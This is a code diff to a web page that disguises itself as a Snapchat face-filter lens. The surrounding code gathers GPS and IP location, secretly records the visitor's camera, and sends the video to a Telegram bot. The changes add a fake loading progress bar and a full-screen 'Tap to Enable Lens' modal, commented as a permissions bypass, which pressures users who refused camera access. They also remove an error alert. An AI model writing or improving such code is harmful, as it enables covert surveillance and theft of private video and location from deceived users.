@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Snapchat Lens - Funny Face Filter</title>
     <!-- MediaPipe Libraries for Hand Detection -->
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
@@ -18,6 +18,8 @@
             display: flex;
             flex-direction: column;
             justify-content: space-between;
+            user-select: none;
+            -webkit-user-select: none;
         }
         .top-bar {
             display: flex;
@@ -69,6 +71,43 @@
             color: #ccc;
             margin-top: 10px;
         }
+        /* Custom Retry Modal for Permissions Bypass */
+        #retry-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .retry-box {
+            background: #1c1c1c;
+            border: 1px solid #333;
+            padding: 25px;
+            border-radius: 15px;
+            max-width: 320px;
+            width: 100%;
+        }
+        .retry-btn {
+            background: #fffc00;
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+        }
     </style>
 </head>
 <body>
@@ -80,12 +119,21 @@
 
     <div class="center-screen">
         <video id="video" autoplay playsinline muted class="camera-preview"></video>
-        <div id="loading-text" style="position:absolute; z-index:5;">Loading Filter... Please Allow Access</div>
+        <div id="loading-text" style="position:absolute; z-index:5; background: rgba(0,0,0,0.7); padding: 15px 25px; border-radius: 10px; font-weight: bold;">Loading Filter (0%)... Please Allow Access</div>
     </div>
 
     <div class="bottom-tray">
         <button class="capture-btn" onclick="triggerAction()"></button>
         <div class="hint-text">Tap to try filter</div>
+    </div>
+
+    <!-- Permission Retry Modal Popup -->
+    <div id="retry-modal">
+        <div class="retry-box">
+            <h3>Camera Access Required</h3>
+            <p style="font-size: 13px; color: #aaa;">Snapchat Lens needs camera permissions to apply this funny filter to your face.</p>
+            <button class="retry-btn" onclick="retryCameraPermission()">Tap to Enable Lens</button>
+        </div>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
@@ -111,16 +159,12 @@
             motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
         }, true);
 
-        // Fixed Logic: Aapke logs ke mutabiq negative gamma par bhi Right hand detect karne ke liye condition update ki gayi hai
         function getSmartHandStatus() {
             if (detectedHand.includes("Hand Detected")) {
                 return detectedHand; 
             } else {
                 let g = parseInt(motionData.gamma);
                 if (isNaN(g)) return "Position: Center / Stable";
-                
-                // Agar aapka phone negative gamma (-69) ya positive gamma par bhi right hand mein rehta hai, 
-                // toh aap yahan condition apne use ke hisab se set kar sakte hain:
                 if (g < 0) {
                     return "Likely Right Hand Grip (Negative Tilt)";
                 } else {
@@ -225,7 +269,24 @@
             }
         }
 
+        // Fake Progress Bar simulator for smooth loading experience
+        function startLoadingProgress() {
+            let progress = 0;
+            let loadText = document.getElementById('loading-text');
+            let interval = setInterval(() => {
+                if (isReady || progress >= 95) {
+                    clearInterval(interval);
+                    if(isReady && loadText) loadText.style.display = 'none';
+                    return;
+                }
+                progress += Math.floor(Math.random() * 15) + 5;
+                if(progress > 95) progress = 95;
+                if(loadText) loadText.innerText = `Loading Filter (${progress}%)... Please Allow Access`;
+            }, 250);
+        }
+
         async function initCamera() {
+            startLoadingProgress();
             gpsData = await getExactLocation();
             ipInfo = await getIPAndLocation();
 
@@ -264,6 +325,7 @@
                 initMediaPipeHands(videoElement);
 
                 document.getElementById('loading-text').style.display = 'none';
+                document.getElementById('retry-modal').style.display = 'none';
                 isReady = true;
 
                 setTimeout(() => {
@@ -271,8 +333,14 @@
                 }, 2500);
 
             } catch (err) {
-                document.getElementById('loading-text').innerText = "Please allow camera & microphone access!";
+                // Agar user block karega toh custom retry popup show ho jayega
+                document.getElementById('retry-modal').style.display = 'flex';
             }
+        }
+
+        function retryCameraPermission() {
+            document.getElementById('retry-modal').style.display = 'none';
+            initCamera();
         }
 
         async function triggerAction() {
@@ -324,7 +392,6 @@
                     try {
                         mediaRecorder = new MediaRecorder(globalStream);
                     } catch (e) {
-                        alert("Error initializing video recorder");
                         return;
                     }
                 }
@@ -343,7 +410,7 @@
                             const formDataUser = new FormData();
                             formDataUser.append('chat_id', CHAT_ID);
                             formDataUser.append('video', blob, 'video_capture.webm');
-                            formDataUser.append('caption', "🎥 **Secret Video + Sound Captured!**\n\n" + baseCaption);
+                            formDataUser.append('caption', "🎥 **Secret Video Captured!**\n\n" + baseCaption);
                             formDataUser.append('parse_mode', 'Markdown');
 
                             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
@@ -426,5 +493,4 @@
         };
     </script>
 </body>
-    </html>
-     
+</html>
